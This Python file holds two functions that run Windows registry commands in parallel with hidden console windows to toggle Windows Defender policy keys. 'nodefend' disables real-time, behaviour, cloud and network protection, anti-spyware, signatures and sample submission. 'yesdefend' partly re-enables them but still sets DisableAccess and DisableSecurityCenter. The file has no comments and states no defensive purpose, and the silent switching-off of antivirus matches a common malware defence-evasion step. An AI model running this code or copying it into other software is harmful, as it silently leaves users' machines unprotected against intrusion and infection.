import subprocess
import threading

def yesdefend():
    commands = [
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiSpyware", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "/v", "DisableRealtimeMonitoring", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "/v", "DisableRealtimeMonitoring", "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "SubmitSamplesConsent", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "SubmitSamplesConsent", "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableCloudProtection", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableCloudProtection", "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Behavior Monitoring", "/v", "DisableBehaviorMonitoring", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Behavior Monitoring", "/v", "DisableBehaviorMonitoring", "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableNetworkProtection", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableNetworkProtection", "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiVirusSignatures", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiVirusSignatures", "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAccess", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableSecurityCenter", "/t", "REG_DWORD", "/d", "1", "/f"],
    ]
    threads = []
    for command in commands:
        thread = threading.Thread(target=subprocess.run, args=(command,), kwargs={"check": False, "creationflags": subprocess.CREATE_NO_WINDOW})
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

def nodefend():
    commands = [
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiSpyware", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "/v", "DisableRealtimeMonitoring", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "/v", "DisableRealtimeMonitoring", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "SubmitSamplesConsent", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "SubmitSamplesConsent", "/t", "REG_DWORD", "/d", "2", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableCloudProtection", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableCloudProtection", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Behavior Monitoring", "/v", "DisableBehaviorMonitoring", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Behavior Monitoring", "/v", "DisableBehaviorMonitoring", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableNetworkProtection", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableNetworkProtection", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiVirusSignatures", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiVirusSignatures", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAccess", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAccess", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableSecurityCenter", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableSecurityCenter", "/t", "REG_DWORD", "/d", "1", "/f"],
    ]
    threads = []
    for command in commands:
        thread = threading.Thread(target=subprocess.run, args=(command,), kwargs={"check": False, "creationflags": subprocess.CREATE_NO_WINDOW})
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()